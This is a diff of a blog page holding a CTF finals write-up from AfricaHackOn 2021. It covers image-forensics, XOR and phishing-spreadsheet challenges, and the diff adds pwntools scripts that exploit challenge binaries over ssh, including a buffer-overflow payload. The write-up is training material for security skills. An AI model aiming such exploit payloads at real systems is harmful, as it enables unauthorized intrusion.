@@ -103,7 +103,7 @@
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "777"
+    "wordCount": "1000"
   }]
   </script>
 
@@ -305,7 +305,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2021-11-09 11:58:56.446 &#43;0000 UTC">9 November 2021</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+      <time datetime="2021-11-09 11:58:56.446 &#43;0000 UTC">9 November 2021</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
     
 
     
@@ -319,6 +319,38 @@
       </div>
     </header>
     <section class="flex flex-col max-w-full mt-0 prose lg:flex-row dark:prose-invert">
+      
+        <div class="order-first px-0 lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8 lg:order-last">
+          <div class="ltr:pl-5 rtl:pr-5 toc lg:sticky lg:top-10 print:hidden">
+            <details open class="mt-0 overflow-hidden rounded-lg rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 lg:mt-3">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 text-neutral-800 dark:text-neutral-100 lg:hidden bg-neutral-100 dark:bg-neutral-700"
+  >
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted ltr:border-l rtl:border-r rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 border-neutral-300 dark:border-neutral-600"
+  >
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#eazzy_forensics-200pts">EaZZy_Forensics 200pts</a></li>
+        <li><a href="#not_so_steg-100pts">NoT_So_Steg 100pts</a></li>
+        <li><a href="#phished-250-pts">Phished 250 pts</a></li>
+        <li><a href="#namecheck-150pts">Namecheck 150pts</a></li>
+        <li><a href="#iamfree-250pts">Iamfree 250pts</a></li>
+        <li><a href="#parser-150pts">Parser 150pts</a></li>
+        <li><a href="#processing-50pts">Processing 50pts</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
       
       <div class="min-w-0 min-h-0 max-w-prose">
         <p>
@@ -338,7 +370,7 @@
 <blockquote>
 <p>My team (<a href="https://twitter.com/fr334aks">fr334aks</a>) and I had the pleasure of taking part in AH2021 CTF finals where we took 3rd out of the ten teams that qualified. Amazing experience, awesome learning opportunity and made new friends. Here are some of the writeups of challenges solved by us and other teams.</p>
 </blockquote>
-<p><strong>EaZZy_Forensics 200pts</strong></p>
+<h3 id="eazzy_forensics-200pts" class="relative group">EaZZy_Forensics 200pts <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#eazzy_forensics-200pts" aria-label="Anchor">#</a></span></h3>
 <p>
 
 
@@ -369,7 +401,7 @@
   
 
 </p>
-<p>I tried opening with sublime text (don’t judge me xD) and it accepted.</p>
+<p>I tried opening with sublime text and got the following display.</p>
 <p>
 
 
@@ -416,9 +448,8 @@
 </p>
 <p>The negative compression is reason enough why the image appears shrunk. So we proceed to play around with the image dimensions</p>
 <p>This tool modsize, does the trick well.</p>
-<blockquote>
-<p>python2 /opt/modsize/modsize.py — width 709 — height 709 eazzzy.png output.png
-
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"> <span class="n">python2</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">modsize</span><span class="o">/</span><span class="n">modsize</span><span class="o">.</span><span class="n">py</span> <span class="err">—</span> <span class="n">width</span> <span class="mi">709</span> <span class="err">—</span> <span class="n">height</span> <span class="mi">709</span> <span class="n">eazzzy</span><span class="o">.</span><span class="n">png</span> <span class="n">output</span><span class="o">.</span><span class="n">png</span>
+</code></pre></div><p>
 
 
 
@@ -432,7 +463,6 @@
   
 
 </p>
-</blockquote>
 <p>Opening the image, we get some output. I got stuck here for a while trying to make sense of writeups online till it came to me that we need the correct dimensions to actually get the right image</p>
 <p>
 
@@ -464,9 +494,8 @@
 
 </p>
 <p>I use a bash one-liner to get different image dimensions (different width same height).</p>
-<blockquote>
-<p>for i in {600..700}; do python2 /opt/modsize/modsize.py — width $i — height $i eazzzy.png out{$i}.png; done
-
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="k">for</span> i in <span class="o">{</span>600..700<span class="o">}</span><span class="p">;</span> <span class="k">do</span> python2 /opt/modsize/modsize.py — width <span class="nv">$i</span> — height <span class="nv">$i</span> eazzzy.png out<span class="o">{</span><span class="nv">$i</span><span class="o">}</span>.png<span class="p">;</span> <span class="k">done</span>
+</code></pre></div><p>
 
 
 
@@ -480,7 +509,6 @@
   
 
 </p>
-</blockquote>
 <p>I went through each of the images painfully since we had around 10 minutes left and scripting would have costed some time.</p>
 <p>
 
@@ -497,7 +525,7 @@
 
 </p>
 <p>We get our flag !</p>
-<p><strong>NoT_So_Steg 100pts</strong></p>
+<h3 id="not_so_steg-100pts" class="relative group">NoT_So_Steg 100pts <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#not_so_steg-100pts" aria-label="Anchor">#</a></span></h3>
 <p>
 
 
@@ -514,9 +542,10 @@
 </p>
 <p>This challenge was rather direct testing your knowledge on the logic of XOR encryption.</p>
 <p>Keep in mind:</p>
-<p>flag ^ key= encrypted_flag</p>
-<p>encrypted_flag ^ key= flag</p>
-<p>We are provided with the encrypted image and the code used to encrypt it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">flag ^ <span class="nv">key</span><span class="o">=</span> encrypted_flag
+
+encrypted_flag ^ <span class="nv">key</span><span class="o">=</span> flag
+</code></pre></div><p>We are provided with the encrypted image and the code used to encrypt it.</p>
 <p>
 
 
@@ -546,7 +575,7 @@
   
 
 </p>
-<p><strong>Phished 250 pts</strong></p>
+<h3 id="phished-250-pts" class="relative group">Phished 250 pts <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#phished-250-pts" aria-label="Anchor">#</a></span></h3>
 <p>Our team didn’t solve the challenge till after the competition. credit to <a href="https://twitter.com/levanto_0">ChasingFlags</a> for the hint on how to solve it.</p>
 <p>We are provided with an excel file that is a phishing document. If I had opened with MS excel and enabled content (in the real world) I would have probably gotten hacked.</p>
 <p>
@@ -593,7 +622,7 @@
   
 
 </p>
-<p>I went back to my editor and tried unhiding the file. Right click on Sheet1 &gt; Unhide</p>
+<p>I went back to my editor and tried unhiding the file. Right click on <code>Sheet1</code> &gt; <code>Unhide</code></p>
 <p>
 
 
@@ -638,7 +667,7 @@
   
 
 </p>
-<p>we get something juicy. Let’s dig deeper. Select all (Ctrl + A) then change to red color and we uncover more</p>
+<p>we get something juicy. Let’s dig deeper. Select all (<code>Ctrl + A</code>) then change to red color and we uncover more</p>
 <p>
 
 
@@ -669,7 +698,7 @@
 
 </p>
 <p>We need to remove all text and remain with the integers, separated by columns. We can take advantage of multiple cursor functionality</p>
-<p>Ctrl+A to select all ,Ctrl+Shift+L to spawn the cursors, then move them to the beginning</p>
+<p><code>Ctrl+A</code> to select all ,<code>Ctrl+Shift+L</code> to spawn the cursors, then move them to the beginning</p>
 <p>
 
 
@@ -684,7 +713,7 @@
   
 
 </p>
-<p>Start by deleting the ‘=CHAR(’</p>
+<p>Start by deleting the <code>=CHAR(</code></p>
 <p>
 
 
@@ -699,7 +728,7 @@
   
 
 </p>
-<p>Move to the end and delete ‘<strong>)</strong>’ then replace with <strong>‘,’</strong></p>
+<p>Move to the end and delete <code>**)**</code> then replace with <code>**,**</code></p>
 <p>
 
 
@@ -714,7 +743,7 @@
   
 
 </p>
-<p>Now replace ‘<strong>&amp;CHAR(</strong>’ with ‘<strong>,</strong>’ and any remaining ‘(’ or ‘)’ with an empty string. You should have something like</p>
+<p>Now replace <code>&amp;CHAR(</code> with <code>,</code> and any remaining <code>(</code> or <code>)</code> with an empty string. You should have something like</p>
 <p>
 
 
@@ -773,7 +802,7 @@
   
 
 </p>
-<p>Let’s pipe it to <strong>strings</strong></p>
+<p>Let’s pipe it to <code>strings</code></p>
 <p>
 
 
@@ -804,9 +833,8 @@
 
 
 <a href="https://twitter.com/amarjit_labu?lang=en">Amarit</a> (the author of this challenge) likes to fish as a hobby. Easter egg maybe xD?</p>
-<p>Lets jump to some rev &amp; pwn.</p>
-<p><em>The solves are as curated by</em> <a href="https://twitter.com/binarychunk?lang=en"><em>Binarychunk</em></a> <em>our team member and talented hacker. Detailed writeups concerning the solves will be done on his blog.</em></p>
-<p><strong>Namecheck 150pts</strong></p>
+<p>Lets jump to some rev &amp; pwn. <em>The solves are as curated by</em> <a href="https://twitter.com/binarychunk?lang=en"><em>Binarychunk</em></a> <em>our team member and talented hacker. Detailed writeups concerning the solves will be done on his blog.</em></p>
+<h3 id="namecheck-150pts" class="relative group">Namecheck 150pts <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#namecheck-150pts" aria-label="Anchor">#</a></span></h3>
 <p>
 
 
@@ -821,7 +849,26 @@
   
 
 </p>
-<p><strong>Iamfree 250pts</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="ch">#!/usr/bin/python3</span>
+<span class="c1">#author: @BinaryChunk</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">#io = process(&#34;./chall&#34;)</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="s2">&#34;namecheck&#34;</span><span class="p">,</span> <span class="s2">&#34;3.21.21.162&#34;</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s2">&#34;guest&#34;</span><span class="p">)</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">shell</span><span class="p">(</span><span class="s2">&#34;./namecheck&#34;</span><span class="p">)</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./chall&#34;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+	<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">36</span>
+	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">systemCheck</span><span class="p">)</span>
+	<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">274</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+	<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+	<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+	<span class="n">main</span><span class="p">()</span>
+</code></pre></div><h3 id="iamfree-250pts" class="relative group">Iamfree 250pts <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#iamfree-250pts" aria-label="Anchor">#</a></span></h3>
 <p>
 
 
@@ -836,7 +883,40 @@
   
 
 </p>
-<p><strong>Parser 150pts</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="ch">#!/usr/bin/python3</span>
+<span class="c1">#author: @BinaryChunk</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">#io = process(&#34;./chall&#34;)</span>
+<span class="n">USER</span> <span class="o">=</span> <span class="s2">&#34;iamfree&#34;</span>
+<span class="n">PASS</span> <span class="o">=</span> <span class="s2">&#34;guest&#34;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">22</span>
+<span class="n">IP</span> <span class="o">=</span> <span class="s2">&#34;3.21.21.162&#34;</span>
+
+<span class="n">shell</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">user</span><span class="o">=</span><span class="n">USER</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="n">IP</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">PORT</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">PASS</span><span class="p">)</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">shell</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;./iamfree&#34;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+	<span class="s2">&#34;&#34;&#34;payload = p32(0x46524545)
+</span><span class="s2">	payload += p32(0x71756565)
+</span><span class="s2">	payload += p32(0x6e333e3a)
+</span><span class="s2">	payload += p32(0x6d343137)
+</span><span class="s2">	io.send(payload)&#34;&#34;&#34;</span>
+
+	<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x4e455721</span><span class="p">)</span>
+	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x4b494e47</span><span class="p">)</span>
+	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x3f</span><span class="p">)</span>
+	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x6d343137</span><span class="p">)</span>
+	<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x75733334</span><span class="p">)</span>
+	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x66743352</span><span class="p">)</span>
+	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x66523333</span><span class="p">)</span>
+	<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+	<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+	<span class="n">main</span><span class="p">()</span>
+</code></pre></div><h3 id="parser-150pts" class="relative group">Parser 150pts <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#parser-150pts" aria-label="Anchor">#</a></span></h3>
 <p>
 
 
@@ -851,7 +931,21 @@
   
 
 </p>
-<p><strong>Processing 50pts</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="ch">#!/usr/bin/python3</span>
+<span class="c1">#author: @BinaryChunk</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">a</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="s2">&#34;parser&#34;</span><span class="p">,</span> <span class="s2">&#34;3.21.21.162&#34;</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s2">&#34;guest&#34;</span><span class="p">)</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">a</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;./parser&#34;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+	<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;AAAA/AAAbAAAiAAAnAAA/AAAcAAAaAAAtAAA AAAfAAAlAAAaAAAg&#34;</span>
+	<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+	<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+	<span class="n">main</span><span class="p">()</span>
+</code></pre></div><h3 id="processing-50pts" class="relative group">Processing 50pts <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#processing-50pts" aria-label="Anchor">#</a></span></h3>
 <p>In processing, we are provided with an executable file that requests for a password when run.</p>
 <p>
 
@@ -868,7 +962,25 @@
 
 </p>
 <p>Using jadx-gui you can reverse the Challenge.jar file and view the source code. The approach taken here involves reversing the code and printing out the flag</p>
-<p>Another interesting approach I saw was <a href="http://twitter.com/ikuamike">ikuamike</a> ‘s solution involving editing the code directly to print the flag : <a href="https://blog.ikuamike.io/posts/2021/africahackon-2021-ctf-finals/">https://blog.ikuamike.io/posts/2021/africahackon-2021-ctf-finals/</a> by ik</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="ch">#!/usr/bin/python3</span>
+
+
+<span class="nb">bytes</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;file.png&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+<span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="mi">81</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">410</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">162</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">281</span><span class="p">,</span> <span class="mi">311</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">981</span><span class="p">,</span> <span class="mi">526</span><span class="p">,</span> <span class="mi">447</span><span class="p">,</span> <span class="mi">787</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">528</span><span class="p">,</span> <span class="mi">410</span><span class="p">,</span> <span class="mi">1227</span><span class="p">,</span> <span class="mi">877</span><span class="p">,</span> <span class="mi">336</span><span class="p">,</span> <span class="mi">354</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">1746</span><span class="p">,</span> <span class="mi">1828</span><span class="p">,</span> <span class="mi">842</span><span class="p">,</span> <span class="mi">2734</span><span class="p">,</span> <span class="mi">1340</span><span class="p">,</span> <span class="mi">1597</span><span class="p">,</span> <span class="mi">908</span><span class="p">,</span> <span class="mi">1451</span><span class="p">,</span> <span class="mi">1563</span><span class="p">,</span> <span class="mi">1137</span><span class="p">,</span> <span class="mi">2226</span><span class="p">,</span> <span class="mi">1206</span><span class="p">,</span> <span class="mi">2486</span><span class="p">,</span> <span class="mi">1909</span><span class="p">,</span> <span class="mi">1566</span><span class="p">,</span> <span class="mi">1908</span><span class="p">,</span> <span class="mi">1200</span><span class="p">,</span> <span class="mi">3604</span><span class="p">,</span> <span class="mi">4318</span><span class="p">,</span> <span class="mi">1546</span><span class="p">,</span> <span class="mi">1793</span><span class="p">,</span> <span class="mi">1581</span><span class="p">]</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)):</span>
+		<span class="n">flag</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="mi">2</span><span class="p">])</span>
+
+	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">]))</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+	<span class="n">main</span><span class="p">()</span>
+</code></pre></div><p>Another approach used by <a href="http://twitter.com/ikuamike">ikuamike</a> ‘s solution involving editing the code directly to print the flag : <a href="https://blog.ikuamike.io/posts/2021/africahackon-2021-ctf-finals/">https://blog.ikuamike.io/posts/2021/africahackon-2021-ctf-finals/</a> by ik</p>
 <p>I hope you can recreate some of the solves. This writeup will be improved later to detail the solves in the rev/pwn and crypto category. Thanks for reading like, share and follow for more soon!</p>
 <p>PS: you can read more on pwn rev and crypto solves in <a href="https://lvmalware.github.io/writeup/2021/11/06/Africahackon-Finals.html">https://lvmalware.github.io/writeup/2021/11/06/Africahackon-Finals.html</a></p>
 
